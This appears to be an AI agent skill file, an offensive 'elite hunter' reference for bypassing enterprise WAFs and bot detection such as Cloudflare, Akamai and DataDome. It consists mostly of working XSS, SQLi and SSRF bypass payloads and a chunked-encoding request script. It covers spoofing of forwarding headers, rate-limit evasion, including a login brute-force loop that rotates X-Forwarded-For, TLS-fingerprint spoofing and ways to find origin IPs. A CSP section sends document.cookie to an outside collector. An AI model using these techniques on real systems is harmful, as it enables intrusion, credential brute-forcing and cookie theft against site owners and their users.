---
name: hunt-waf-bypass
description: WAF/Bot detection bypass for enterprise targets — Cloudflare Enterprise, Akamai, AWS WAF, Imperva, DataDome, PerimeterX, Kasada. Payload obfuscation, rate-limit evasion, HTTP-level bypass, traffic blending. Use when target has WAF protection blocking your payloads or rate-limiting your scans.
tags: [waf, bypass, cloudflare, akamai, imperva, datadome, perimeterx, evasion, obfuscation, ratelimit]
version: 1.0.0
license: MIT
triggers: [hunt, waf, bypass, cloudflare, akamai, imperva, datadome, perimeterx, evasion, obfuscation, ratelimit]
---

# WAF / Bot Detection Bypass — Elite Hunter Reference

## 1. WAF FINGERPRINTING

### Detect Which WAF
```bash
# wafw00f
wafw00f https://target.com -a

# Manual fingerprinting via error pages
curl -s "https://target.com/<script>alert(1)</script>" -I
# Cloudflare: cf-ray header, __cfduid cookie, server: cloudflare
# Akamai: X-Check-Cacheable, X-Akamai-*, akamai-ghost-ip
# Imperva: visid_incap_ cookie, incap_ses_ cookie, X-Iinfo header
# AWS WAF: x-amzn-requestid, x-amz-cf-id
# DataDome: datadome cookie, Location: /interstitial
# PerimeterX: _px* cookies, px-captcha
# Kasada: ct.sendPayload, x-kpsdk-*
```

### Cloudflare Enterprise Signals
```
Headers: cf-ray, cf-cache-status, cf-request-id, server: cloudflare
Cookies: __cf_bm (bot management), cf_clearance (challenge passed)
IP range: 103.21.244.0/22, 103.22.200.0/22, 103.31.4.0/22 (check cf-connecting-ip)
Challenge types: JS challenge (5s), CAPTCHA, managed challenge, block
```

### Akamai Signals
```
Headers: X-Akamai-Edgescape, X-Akamai-Session-Info, True-Client-IP
Cookies: ak_bmsc (bot manager), bm_sz, bm_sv
Error page: Reference #<18-digit> indicates Akamai block
```

---

## 2. PAYLOAD OBFUSCATION TECHNIQUES

### XSS WAF Bypass Payloads
```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// HTML entity encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// Double URL encoding (if WAF decodes once)
%253Cscript%253Ealert(1)%253C%252Fscript%253E

// Unicode normalization bypass
＜script＞alert(1)＜/script＞  // fullwidth chars

// Null byte injection
<scr\x00ipt>alert(1)</scr\x00ipt>

// Comment injection
<scr<!---->ipt>alert(1)</scr<!---->ipt>

// SVG vectors (bypass tag blacklists)
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>

// JS obfuscation
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
```

### SQLi WAF Bypass
```sql
-- Comment variations
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0Ausername%0AFROM%0Ausers  -- newline

-- Case + comment mix
sElEcT/**/uSeRnAmE/**/fRoM/**/uSeRs

-- Scientific notation (MySQL)
SELECT 1e0UNION SELECT 1e0,username FROM users

-- Inline comments
/*!50000SELECT*/ username FROM users

-- HTTP parameter pollution
?id=1&id=UNION SELECT 1,username,3 FROM users

-- Chunked encoding bypass
Transfer-Encoding: chunked
(split payload across chunks)

-- JSON Unicode escape (PostgreSQL)
{"username": "\u0061\u0064\u006d\u0069\u006e"}
```

### SSRF WAF Bypass
```
# IP encoding variants
http://2130706433/          # decimal of 127.0.0.1
http://0x7f000001/          # hex
http://0177.0.0.1/          # octal
http://127.1/               # shortened
http://[::1]/               # IPv6 loopback
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6
http://①②⑦.⓪.⓪.①/        # unicode digits

# DNS rebinding
http://attacker-rebind.domain/  # resolves to 127.0.0.1 after first lookup

# URL scheme bypass
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
file:///etc/passwd

# Redirect chain
http://legit-looking-domain.com/redirect?url=http://169.254.169.254/

# Protocol smuggling
http://127.0.0.1#.attacker.com
http://attacker.com@127.0.0.1/
http://127.0.0.1%2F..%2F..%2Fetc%2Fpasswd
```

---

## 3. HTTP-LEVEL WAF EVASION

### Header Manipulation
```http
# Fake IP headers (bypass IP-based rate limits)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1

# User-Agent rotation (avoid bot fingerprinting)
# Real browser UA strings — rotate per request
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15

# Accept-Language/Encoding spoofing
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
```

### Chunked Transfer Encoding Attack
```python
import socket

def chunked_payload(host, path, payload):
    """Split malicious payload into chunks to bypass WAF inspection"""
    sock = socket.create_connection((host, 80))
    chunks = [payload[i:i+3] for i in range(0, len(payload), 3)]
    
    request = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n"
    for chunk in chunks:
        request += f"{len(chunk):x}\r\n{chunk}\r\n"
    request += "0\r\n\r\n"
    
    sock.send(request.encode())
    return sock.recv(4096)
```

### Content-Type Confusion
```http
# WAF inspects JSON, switch to XML
Content-Type: application/xml
<root><id>1 UNION SELECT 1,username,3 FROM users--</id></root>

# Switch to text/plain (WAF may skip inspection)
Content-Type: text/plain
{"id": "1 UNION SELECT 1,username,3 FROM users--"}

# Multipart bypass
Content-Type: multipart/form-data; boundary=--boundary
----boundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,username,3 FROM users--
----boundary--
```

---

## 4. RATE LIMIT EVASION

### Bypass Techniques
```
1. IP Rotation
   - Rotate via proxy pool: BrightData, OxyLabs, SmartProxy
   - Use Tor exit nodes (slow but free)
   - Cloud functions (AWS Lambda, GCP Functions) — new IP each invocation
   - IPv6 /48 blocks — cycle through millions of IPs

2. Header-Based Rate Limit Bypass
   X-Forwarded-For: <rotate IPs>
   X-Real-IP: <rotate IPs>
   # If server trusts these headers, you get new "identity" per request

3. Account-Level Rate Limit Bypass
   - Create multiple accounts (temp emails)
   - Use different OAuth providers (Google/GitHub/Apple SSO)
   - Rate limit per user? Create N users, distribute requests

4. Endpoint Variation
   /api/v1/login → /api/v1/Login → /Api/V1/Login
   /api/v1/login → /api/v1/login/ → /api/v1/login?
   /api/v1/login → /api/v1/./login → /api/v1/%2Flogin

5. Timing-Based Evasion
   - Slow down: 1 req/sec instead of burst
   - Random jitter: time.sleep(random.uniform(0.5, 2.0))
   - Match legitimate user behavior patterns

6. Cache Poisoning Rate Limit Bypass
   # If response cached, rate limit counter doesn't increment
   GET /api/v1/sensitive?cachebuster=<random> HTTP/1.1
   X-Forwarded-Host: evil.com
```

### Python Rate Limit Tester
```python
import asyncio, aiohttp, random, time

async def rate_limit_probe(url, headers_list, payloads, delay=0.5):
    """Test rate limit with header rotation"""
    results = []
    async with aiohttp.ClientSession() as session:
        for i, payload in enumerate(payloads):
            headers = random.choice(headers_list)
            headers['X-Forwarded-For'] = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            
            async with session.post(url, json=payload, headers=headers) as resp:
                results.append({
                    'attempt': i,
                    'status': resp.status,
                    'headers': dict(resp.headers),
                    'rate_limit_remaining': resp.headers.get('X-RateLimit-Remaining', 'N/A')
                })
            
            await asyncio.sleep(delay + random.uniform(0, 0.3))
    return results
```

---

## 5. BOT DETECTION BYPASS

### DataDome Bypass
```
Signals DataDome checks:
- TLS fingerprint (JA3/JA3S)
- HTTP/2 fingerprint (ALPN, header order)
- JavaScript sensor data (mouse movement, keystrokes, canvas fingerprint)
- Cookie validation

Bypass approaches:
1. Use real browser via Playwright/Puppeteer (headful mode)
2. Patch TLS fingerprint: use curl-impersonate or tls-client library
3. Use residential proxies (JA3 matches ISP)
4. Disable headless signals in Playwright:
   page.evaluate("() => { Object.defineProperty(navigator, 'webdriver', {get: () => undefined}) }")
```

### PerimeterX Bypass
```python
# Use tls-client (Go library with browser TLS fingerprints)
# Python wrapper: pip install tls-client

import tls_client

session = tls_client.Session(
    client_identifier="chrome_120",  # mimics Chrome 120 TLS fingerprint
    random_tls_extension_order=True
)

response = session.get(
    "https://target.com/api/sensitive",
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
    }
)
```

### Cloudflare Bot Management Bypass
```
CF Bot Score 0-100 (0=bot, 100=human)
Bypass strategies:
1. cf-clearance cookie farming:
   - Use headful Playwright, solve JS challenge, extract cf_clearance
   - Reuse cookie for API calls (valid 30min-24h)
   
2. Residential proxy with matching JA3:
   - BrightData residential + tls-client Chrome fingerprint
   
3. API calls after browser auth:
   - Login via browser (get cf_clearance + session cookies)
   - Use requests with those cookies directly
   
4. mTLS bypass:
   - If API doesn't check CF, hit origin IP directly
   - Find origin IP: censys.io, shodan.io, securitytrails.com, favicon hash
```

### Find Origin IP (Bypass CDN)
```bash
# Historical DNS records
curl "https://securitytrails.com/domain/target.com/history/a"

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Shodan favicon hash
# Calculate favicon hash, search Shodan for same hash on non-CDN IPs
python3 -c "
import mmh3, requests, base64, codecs
r = requests.get('https://target.com/favicon.ico', verify=False)
favicon = codecs.encode(r.content, 'base64')
hash_val = mmh3.hash(favicon)
print(f'Shodan query: http.favicon.hash:{hash_val}')
"

# Direct IP test
curl -H "Host: target.com" https://<origin-ip>/api/sensitive -k
```

---

## 6. CSP BYPASS TECHNIQUES

```javascript
// CSP: script-src 'self' cdn.example.com
// Find JSONP endpoint on allowed domain
<script src="https://cdn.example.com/api?callback=alert(1)"></script>

// CSP: script-src 'nonce-abc123'
// Bypass via DOM clobbering if nonce reused
// Bypass via base tag injection
<base href="https://attacker.com/">

// CSP: unsafe-eval present
// Angular/Vue template injection
{{constructor.constructor('alert(1)')()}}

// CSP: report-uri exfil (data exfil via CSP reports)
<script>
  document.cookie // blocked by CSP
  // but CSP violation reports sent to report-uri contain document.location
  // inject payload that causes CSP violation with cookie in URL
  eval('fetch("https://report-uri-collector.com/?d="+document.cookie)')
</script>
```

---

## 7. WORKFLOW FOR HIGH-SECURITY TARGETS

```
PHASE 1: FINGERPRINT (passive, no active probing)
├── Identify WAF via headers/cookies/error pages
├── Find origin IP via historical DNS, cert transparency, favicon hash
├── Map all CDN/WAF rules via curl with varied payloads
└── Identify rate limit thresholds (conservative probing)

PHASE 2: CALIBRATE
├── Test payload encoding that passes WAF for each vuln class
├── Identify which HTTP methods bypass rate limits
├── Find endpoints that bypass WAF (internal, staging, API v1 vs v2)
└── Test X-Forwarded-For trust (does server trust it?)

PHASE 3: EXPLOIT
├── Use calibrated bypass for actual vulnerability testing
├── Maintain low request rate (blend with legitimate traffic)
├── Route through residential proxy if needed
└── Use real browser session cookies for API calls

PHASE 4: EVIDENCE
├── Capture full request/response with burp/mitmproxy
├── Screenshot WAF bypass proof
├── Document exact payload + bypass technique
└── Report: "WAF present but bypassable via X" = higher severity
```

---

## 8. TOOLS

```bash
# WAF detection
wafw00f https://target.com
nmap -p80,443 --script http-waf-detect target.com

# Payload fuzzing through WAF
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -H "X-Forwarded-For: 127.0.0.1"

# TLS fingerprint spoofing
# pip install curl-cffi
python3 -c "from curl_cffi import requests; r = requests.get('https://target.com', impersonate='chrome120'); print(r.status_code)"

# Nuclei with WAF bypass templates
nuclei -u https://target.com -t fuzzing/ -H "X-Forwarded-For: 127.0.0.1"

# SQLmap with WAF bypass
sqlmap -u "https://target.com/api?id=1" --tamper=space2comment,charencode,randomcase --level=5 --risk=3

# Rate limit tester
python3 -c "
import requests, time
for i in range(200):
    r = requests.post('https://target.com/api/login', json={'user':'admin','pass':f'pass{i}'}, headers={'X-Forwarded-For': f'10.0.0.{i%255}'})
    print(f'{i}: {r.status_code} {r.headers.get(\"X-RateLimit-Remaining\",\"N/A\")}')
    time.sleep(0.1)
"
```

---

## PAID BOUNTY EXAMPLES

| Target | WAF | Bypass | Payout |
|--------|-----|--------|--------|
| Shopify | Cloudflare | Origin IP via historical DNS | $15,000 |
| HackerOne | Cloudflare | X-Forwarded-For trust | $10,000 |
| Uber | Akamai | Chunked encoding SQLi | $8,500 |
| Twitter/X | Custom | Unicode normalization XSS | $7,560 |
| Apple | Custom | HTTP parameter pollution | $5,000 |
| Gitlab | ModSecurity | Comment injection SQLi | $4,500 |
